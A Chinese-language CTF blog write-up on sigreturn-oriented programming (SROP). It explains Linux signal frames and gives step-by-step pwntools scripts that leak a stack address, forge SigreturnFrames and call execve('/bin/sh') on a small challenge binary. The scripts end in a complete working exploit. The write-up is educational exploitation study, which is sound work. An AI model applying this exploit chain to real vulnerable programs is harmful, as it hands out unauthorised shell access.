---
title: lys srop Writes up
published: 2024-09-04
tags: [CTF]
category: Cyber Security
draft: false
image: 'image.png'
---


## Before

感謝 [naup](https://naupjjin.github.io/) 大大手把手教我怎麼串出 srop www, 然後也從他的 [筆記中](https://hackmd.io/@naup96321/BJh1D4BHA) 參考了一些東東,請接受我的膜拜w

### signal 機制

- kernel向process發起signal機制，Process暫時中斷，進入kernel
- 保存環境(簡單來說就是保存了各個暫存器的值，將所有東西壓入stack，並壓入signal相關訊息)，這段記憶體被稱為Signal Frame
- 到signal handler處理
- 恢復環境
- 繼續執行process

![image](https://hackmd.io/_uploads/H1PGby7jA.png)

![image](https://hackmd.io/_uploads/rkUL-yXiC.png)

signal frame:
```c=
struct _fpstate
    {
      /* FPU environment matching the 64-bit FXSAVE layout.  */
      __uint16_t        cwd;
      __uint16_t        swd;
      __uint16_t        ftw;
      __uint16_t        fop;
      __uint64_t        rip;
      __uint64_t        rdp;
      __uint32_t        mxcsr;
      __uint32_t        mxcr_mask;
      struct _fpxreg    _st[8];
      struct _xmmreg    _xmm[16];
      __uint32_t        padding[24];
    };

struct sigcontext
    {
      __uint64_t r8;
      __uint64_t r9;
      __uint64_t r10;
      __uint64_t r11;
      __uint64_t r12;
      __uint64_t r13;
      __uint64_t r14;
      __uint64_t r15;
      __uint64_t rdi;
      __uint64_t rsi;
      __uint64_t rbp;
      __uint64_t rbx;
      __uint64_t rdx;
      __uint64_t rax;
      __uint64_t rcx;
      __uint64_t rsp;
      __uint64_t rip;
      __uint64_t eflags;
      unsigned short cs;
      unsigned short gs;
      unsigned short fs;
      unsigned short __pad0;
      __uint64_t err;
      __uint64_t trapno;
      __uint64_t oldmask;
      __uint64_t cr2;
      __extension__ union
        {
          struct _fpstate * fpstate;
          __uint64_t __fpstate_word;
        };
      __uint64_t __reserved1 [8];
    };
```

![image](https://hackmd.io/_uploads/rJcKWkmoA.png)

### 漏洞在哪?

如果我們能控制Stack的值，因為他在恢復環境時沒有驗證，所以可以任意修改來串ROP(透過偽造sigframe來調用惡意syscall)

### SROP前提:

- 有BOF
- 可以去系統調用 signature (或用read控rax之類的)
- /bin/sh 地址可以寫入並拿到該地址或是直接有目標及有位址
- syscall 地址

### SROP Chain:

![image](https://hackmd.io/_uploads/ByiLGyQo0.png)

如果有ret，那可以構造像是這樣的 chain 來呼叫多個 syscall

### SROP 觸發流程

- 控制stack
- 偽造Signal Frame
- 觸發Sigreturn
- get shell


### demo iSoROPistic:

同: https://ephemerally.top/post/9

chal.asm:
```asm=
; nasm -f elf64 chal.asm -o chal.o && ld chal.o -o chal
.text:
    global _start

_start:
    xor rax, rax
    mov edx, 0x400
    mov rsi, rsp
    mov rdi, rax
    syscall
    ret

```

#### checksec:

![image](https://hackmd.io/_uploads/Hk8VWxXiC.png)

#### ida:

![image](https://hackmd.io/_uploads/r1t0-x7sC.png)

#### 解題整理

rax 代表你可以控 syscall 中的哪一個東西

看完 source 之後會發現，他其實利用了 systemcall table 的 read，因為在 Linux 中 rax = 0 會變成 call read

在考慮偽造 Signal Frame 的情況下，我們可以對多個暫存器以及堆疊指標進行控制，做到 syscall(59,'/bin/sh',0,0)；59 就是 execve，相當於 execve("/bin/sh",0,0)；
我們透過控制 read 讀入的位元組數，控制 rax=1，執行 write 系統呼叫，藉此洩漏堆疊位址。
偽造 Signal Frame 來實現 read，在指定位址讀入 "/bin/sh"。
控制 read 讀入的位元組數，實現 sigreturn 函式，套用我們剛剛偽造的暫存器和堆疊指標資訊。
在新的堆疊處，偽造 Signal Frame 來實現 execve。
再次控制 read 讀入的位元組數，觸發 sigreturn，最終拿到 shell。

#### 解題思路

![image](https://hackmd.io/_uploads/SJQ-IXmoC.png)

##### Leak Stack addr

程式運行的邏輯是 ret 第一次 -> call read -> 送 1bytes 進去 -> ret 第二次 call write 

- 而這邊有一個 trick 是 rax return value 是讀到幾個 bytes

```python3=
from pwn import *
import time

context.arch='amd64'

r=process('./chal')

#DEBUG=raw_input('Debug:y/n'+'\n')
DEBUG=input('Debug:y/n'+'\n')

if DEBUG=="y":
    context.log_level = 'debug'
    context.arch = 'amd64'
    context.os = 'linux'
    context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def p():
    gdb.attach(r)


payload1 = p64(0x401000)+p64(0x401000) # read -> write

r.send(payload1)

time.sleep(0.5)

r.send(b'\x03')

leak_stack=u64(r.recv()[8:16])

print('leak libc: ',hex(leak_stack))

r.interactive()
```

###### signal.return.read /bin/sh 預留位置給　/bin/sh

理解完上面的東西之後，我們要 call execve /bin/sh 需要先讓　sigreturn 正確地 恢復暫存器狀態，而且這邊也可以控制後續的 /bin/sh

而前面兩次 ret 完讓我們成功 leak stack addr ， 讓我們需要再 call 一次 ret 到 start

![image](https://hackmd.io/_uploads/r1tLCHVoR.png)

我們也需要讓 syscall call 到 rt_sigreturn 所以們只能讀 15 bytes

```python3=
from pwn import *
import time
r=process('./chal')

#DEBUG=raw_input('Debug:y/n'+'\n')
DEBUG=input('Debug:y/n'+'\n')

if DEBUG=="y":
    context.log_level = 'debug'
    context.arch = 'amd64'
    context.os = 'linux'
    context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def p():
    gdb.attach(r)


payload1 = p64(0x401000)+p64(0x401000)+p64(0x401000) # read -> write -> read

r.send(payload1)

time.sleep(0.5)

r.send(b'\x03')

leak_stack=u64(r.recv()[8:16])

print('leak libc: ',hex(leak_stack))

start=0x401000
syscall=0x40100e

read = SigreturnFrame()
read.rax = constants.SYS_read
read.rdi = 0
read.rsi = leak_stack
read.rdx = 0x400
read.rsp = leak_stack
read.rip = syscall

payload2=r.send(p64(start)+p64(syscall)+bytes(read))

r.send(payload2)

time.sleep(0.5)

r.send(payload2[8:23])

r.interactive()

```

流程->

```python=
payload2=r.send(p64(start)+p64(syscall)+bytes(read))
```

讓 payload 進來

```python=
start ->
syscall ->
read.SigreturnFrame
```

ret跳回start，讀15個byte進來

```python=
syscall
read.SigreturnFrame
```

ret到syscall，現在rax=15(call sys_rt_sigreturn)

```python=
read.SigreturnFrame
```
回復位置成read.SigreturnFrame的樣子

###### call signal.ret.execve /bin/sh 


```
execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = leak_stack_base + 0x108 
execve.rsi = 0x0
execve.rdx = 0x0
execve.rsp = leak_stack_base 
execve.rip = syscall

payload5 = p64(start)+p64(syscall)+bytes(execve)
print(len(payload5))
payload5 += b'/bin/sh\x00'
r.send(payload5)

r.send(payload5[8:23])
```
讓剛剛設定好的 signal.ret.read /bin/sh 去被 sginal.ret.execve 讀到 

![image](https://hackmd.io/_uploads/HJ4m48NjA.png)

final exploit.py
```python3=
from pwn import *
import time

context.arch='amd64'

r=process('./chal')

#DEBUG=raw_input('Debug:y/n'+'\n')
DEBUG=input('Debug:y/n'+'\n')

if DEBUG=="y":
    context.log_level = 'debug'
    context.arch = 'amd64'
    context.os = 'linux'
    context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def p():
    gdb.attach(r)


payload1 = p64(0x401000)+p64(0x401000)+p64(0x401000) # read -> write -> read

r.send(payload1)

time.sleep(0.5)

r.send(b'\x03')

leak_stack=u64(r.recv()[8:16])

print('leak libc: ',hex(leak_stack))

#leak stack addr

start=0x401000
syscall=0x40100e

read = SigreturnFrame()
read.rax = constants.SYS_read
read.rdi = 0
read.rsi = leak_stack
read.rdx = 0x400
read.rsp = leak_stack
read.rip = syscall

payload2=(p64(start)+p64(syscall)+bytes(read))

r.send(payload2)

time.sleep(0.5)

r.send(payload2[8:23])

#call signal.read

execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = leak_stack+ 0x108 # /bin/sh的偏移
execve.rsi = 0x0
execve.rdx = 0x0
execve.rsp = leak_stack 
execve.rip = syscall

payload3=p64(start)+p64(syscall)+bytes(execve)+b'/bin/sh\x00'
print(len(payload3))

time.sleep(0.5)

r.send(payload3)

time.sleep(0.5)

r.send(payload3[8:23])

#call signal.execve

r.interactive()

```



## Reference

https://xz.aliyun.com/t/13313?time__1311=GqmxuD2DgQi%3DD%3DD%2FD0erGktKq0KlPgr4rD#toc-1

https://hackmd.io/@naup96321/BJh1D4BHA

https://ephemerally.top/post/9